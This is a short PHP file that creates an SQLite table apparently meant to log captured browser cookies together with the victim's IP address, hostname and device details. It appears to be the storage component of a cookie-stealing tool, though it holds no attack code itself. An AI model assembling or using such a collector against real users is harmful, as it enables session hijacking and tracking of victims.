<?php
	$db = new SQLite3('db/CookieCatch.db');
	$db->exec("CREATE TABLE IF NOT EXISTS catches(id INTEGER PRIMARY KEY AUTOINCREMENT, cookie TEXT, decoded_cookie TEXT, ip_address TEXT, hostname TEXT, device_details TEXT, catch_date TIMESTAMP)");
?>
